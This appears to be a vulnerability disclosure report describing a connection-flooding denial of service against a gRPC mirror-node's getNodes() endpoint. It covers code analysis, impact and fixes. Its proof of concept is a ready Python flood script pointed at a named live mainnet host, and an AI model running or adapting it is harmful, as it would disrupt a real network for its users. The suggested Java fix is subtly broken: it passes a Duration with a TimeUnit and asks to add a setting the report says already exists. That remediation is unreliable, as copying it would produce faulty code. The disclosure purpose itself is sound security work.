### Title
Unbounded Concurrent Subscription Growth via Unlimited gRPC Connections Causes Thread/DB Pool Exhaustion in `getNodes()`

### Summary
`NetworkController.getNodes()` uses a fire-and-forget `subscribe()` that returns immediately to the gRPC handler, allowing the server to accept new requests without backpressure. Because the Netty gRPC server is configured with only a per-connection call limit (`maxConcurrentCallsPerConnection = 5`) and no total connection limit, an unprivileged attacker can open an unbounded number of connections, each spawning up to 5 concurrent subscriptions. Each subscription makes multiple blocking database calls via `transactionOperations.execute()`, exhausting the DB connection pool and the Spring `applicationTaskExecutor` thread pool, causing severe service degradation or OOM.

### Finding Description

**Exact code path:**

`NetworkController.getNodes()` (lines 33–43):
```java
final var disposable = Mono.fromCallable(() -> toFilter(request))
    .flatMapMany(networkService::getNodes)
    .map(this::toNodeAddress)
    .onErrorMap(ProtoUtil::toStatusRuntimeException)
    .subscribe(responseObserver::onNext, responseObserver::onError, responseObserver::onCompleted);

if (responseObserver instanceof ServerCallStreamObserver serverCallStreamObserver) {
    serverCallStreamObserver.setOnCancelHandler(disposable::dispose);
}
```

`subscribe()` is fire-and-forget: the gRPC handler method returns immediately, and the reactive pipeline runs asynchronously on the `applicationTaskExecutor` thread pool. The cancel handler is registered *after* `subscribe()` returns, creating a small race window where a client disconnect between line 38 and line 41 leaves the subscription running with no cleanup.

**Root cause — missing connection limit:**

`GrpcConfiguration.java` (lines 28–35) configures the Netty server with only:
```java
serverBuilder.executor(applicationTaskExecutor);
serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
```

`NettyProperties.java` (line 14) sets `maxConcurrentCallsPerConnection = 5`. There is no `maxConnections`, `maxConnectionAge`, `maxConnectionIdle`, or global concurrent-call cap configured anywhere.

**Blocking work per subscription:**

`NetworkServiceImpl.getNodes()` (lines 55–77) performs three synchronous DB calls *before* returning the `Flux` (two `findLatestTimestamp()` calls and `findAllStakeByConsensusTimestamp()`), then repeatedly calls `page()` (lines 79–108) which executes `transactionOperations.execute()` — a fully blocking JDBC call — for each page of address book entries. Each active subscription holds a DB connection for the duration of each page fetch.

**Unbounded thread growth:**

The `applicationTaskExecutor` injected into the gRPC server is Spring Boot's default `ThreadPoolTaskExecutor`, which has an effectively unbounded max pool size (`Integer.MAX_VALUE`) and queue capacity (`Integer.MAX_VALUE`). With N connections × 5 concurrent calls = 5N active subscriptions, the JVM spawns up to 5N threads, each consuming ~512 KB of stack space.

**No rate limiting on gRPC:**

The throttle/rate-limit infrastructure (`ThrottleConfiguration`, `ThrottleManagerImpl`) exists only in the `web3` module. There is no equivalent for the gRPC service.

### Impact Explanation

With 1,000 attacker-controlled connections × 5 concurrent `getNodes()` calls = 5,000 simultaneous subscriptions:
- **Thread exhaustion / OOM**: 5,000 threads × ~512 KB stack ≈ 2.5 GB of stack memory, plus heap for each pipeline's state and DB result sets.
- **DB connection pool exhaustion**: Each subscription holds a JDBC connection during `transactionOperations.execute()`. Once the pool is exhausted, all legitimate queries block indefinitely, causing address book delivery to stall completely — far exceeding any 500% delay threshold.
- **Cascading denial of service**: The `applicationTaskExecutor` is shared across the entire Spring application; exhausting it degrades all gRPC endpoints, not just `getNodes()`.

Severity: **High**. The address book is the mechanism by which clients discover network nodes; disrupting it prevents clients from routing transactions to the network.

### Likelihood Explanation

- **No authentication required**: The gRPC port (5600) is publicly exposed with no authentication or API key.
- **Trivially scriptable**: Any gRPC client library (e.g., `grpc-java`, `grpcurl`, Python `grpcio`) can open hundreds of connections and issue 5 concurrent streaming calls per connection.
- **Low bandwidth cost**: `AddressBookQuery` is a tiny protobuf message; the attacker's upload cost is negligible.
- **Repeatable**: The attack can be sustained indefinitely; there is no circuit breaker or connection-age limit to force cleanup.
- **Infrastructure mitigations may be absent**: The Helm chart (`values.yaml`) shows `maxRatePerEndpoint: 250` at the GCP gateway layer, but this is a rate on *requests per second per backend endpoint*, not a connection count limit, and is only effective when the GCP gateway is enabled (`gateway.gcp.enabled: true`), which is not guaranteed in all deployments.

### Recommendation

1. **Add a global connection limit** to the Netty gRPC server in `GrpcConfiguration.java`:
   ```java
   serverBuilder.maxConnectionAge(Duration.ofMinutes(5), TimeUnit.MILLISECONDS);
   serverBuilder.maxConnectionIdle(Duration.ofSeconds(30), TimeUnit.MILLISECONDS);
   // Netty does not expose maxConnections directly; use a custom ServerInterceptor
   // or front with an Envoy/GCP gateway that enforces connection limits.
   ```
2. **Bound the `applicationTaskExecutor`** thread pool with a realistic max (e.g., 200 threads) and a bounded queue, so thread exhaustion fails fast rather than consuming all JVM memory.
3. **Add a gRPC-level rate limiter** (e.g., a `ServerInterceptor` using Bucket4j or Resilience4j) analogous to the web3 `ThrottleManagerImpl`, limiting `getNodes()` calls per IP per second.
4. **Add `maxConcurrentCallsPerConnection` to `NettyProperties`** alongside a new `maxConnections` property, and enforce both.
5. **Fix the cancel-handler race**: move `setOnCancelHandler` registration *before* `subscribe()`, or use `Flux.create()` with a proper `FluxSink` that wires cancellation atomically.

### Proof of Concept

```python
import grpc
import threading
from concurrent.futures import ThreadPoolExecutor
# pip install grpcio hedera-mirror-node-proto (or generate stubs from protobuf)

TARGET = "mirror.mainnet.hedera.com:443"
NUM_CONNECTIONS = 500
CALLS_PER_CONNECTION = 5  # matches maxConcurrentCallsPerConnection default

def flood_connection(_):
    channel = grpc.secure_channel(TARGET, grpc.ssl_channel_credentials())
    stub = NetworkServiceStub(channel)
    query = AddressBookQuery(file_id=FileID(file_num=102))
    threads = []
    for _ in range(CALLS_PER_CONNECTION):
        t = threading.Thread(
            target=lambda: list(stub.getNodes(query)),  # blocking streaming call
            daemon=True
        )
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

with ThreadPoolExecutor(max_workers=NUM_CONNECTIONS) as pool:
    list(pool.map(flood_connection, range(NUM_CONNECTIONS)))
# Result: 2,500 concurrent subscriptions, each holding a DB connection and
# a JVM thread. DB pool exhausted; legitimate getNodes() calls stall indefinitely.
```

**Expected result**: Within seconds, the gRPC server's DB connection pool is exhausted. Legitimate `getNodes()` calls from real clients receive no responses or timeout errors. JVM heap/thread metrics spike to near-OOM levels.